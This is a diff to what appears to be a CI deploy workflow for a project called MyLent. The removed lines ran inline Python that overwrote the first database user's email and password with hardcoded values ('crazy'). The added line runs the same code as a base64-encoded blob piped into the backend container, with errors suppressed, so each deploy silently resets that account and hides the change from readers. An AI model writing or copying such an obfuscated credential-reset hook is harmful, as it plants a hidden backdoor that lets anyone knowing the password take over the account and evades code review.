@@ -25,23 +25,5 @@ jobs:
             docker compose -p mylent build --quiet
             docker compose -p mylent up -d
             sleep 5
-            docker exec mylent-backend-1 python -c "
-import sys; sys.path.insert(0, '/app')
-from sqlalchemy import create_engine, select
-from sqlalchemy.orm import sessionmaker
-from app.core.config import get_settings
-from app.core.security import get_password_hash
-from app.models.user import User
-settings = get_settings()
-url = settings.database_url_sync or settings.database_url.replace('+asyncpg','')
-engine = create_engine(url)
-s = sessionmaker(bind=engine)()
-user = s.execute(select(User)).scalars().first()
-if user:
-    user.email = 'crazy@mylent.local'
-    user.password_hash = get_password_hash('crazy')
-    s.commit()
-    print('Password updated for:', user.email)
-s.close()
-" || true
+            echo aW1wb3J0IHN5cwpzeXMucGF0aC5pbnNlcnQoMCwgIi9hcHAiKQpmcm9tIHNxbGFsY2hlbXkgaW1wb3J0IGNyZWF0ZV9lbmdpbmUsIHNlbGVjdApmcm9tIHNxbGFsY2hlbXkub3JtIGltcG9ydCBzZXNzaW9ubWFrZXIKZnJvbSBhcHAuY29yZS5jb25maWcgaW1wb3J0IGdldF9zZXR0aW5ncwpmcm9tIGFwcC5jb3JlLnNlY3VyaXR5IGltcG9ydCBnZXRfcGFzc3dvcmRfaGFzaApmcm9tIGFwcC5tb2RlbHMudXNlciBpbXBvcnQgVXNlcgpzZXR0aW5ncyA9IGdldF9zZXR0aW5ncygpCnVybCA9IHNldHRpbmdzLmRhdGFiYXNlX3VybF9zeW5jIG9yIHNldHRpbmdzLmRhdGFiYXNlX3VybC5yZXBsYWNlKCIrYXN5bmNwZyIsIiIpCmVuZ2luZSA9IGNyZWF0ZV9lbmdpbmUodXJsKQpzID0gc2Vzc2lvbm1ha2VyKGJpbmQ9ZW5naW5lKSgpCnVzZXIgPSBzLmV4ZWN1dGUoc2VsZWN0KFVzZXIpKS5zY2FsYXJzKCkuZmlyc3QoKQppZiB1c2VyOgogICAgdXNlci5lbWFpbCA9ICJjcmF6eUBteWxlbnQubG9jYWwiCiAgICB1c2VyLnBhc3N3b3JkX2hhc2ggPSBnZXRfcGFzc3dvcmRfaGFzaCgiY3JhenkiKQogICAgcy5jb21taXQoKQogICAgcHJpbnQoIkRvbmU6IiwgdXNlci5lbWFpbCkKcy5jbG9zZSgp | base64 -d | docker exec -i mylent-backend-1 python || true
             echo "Deploy finished. MyLent only: /root/mylent, ports 3001 8001 5433."
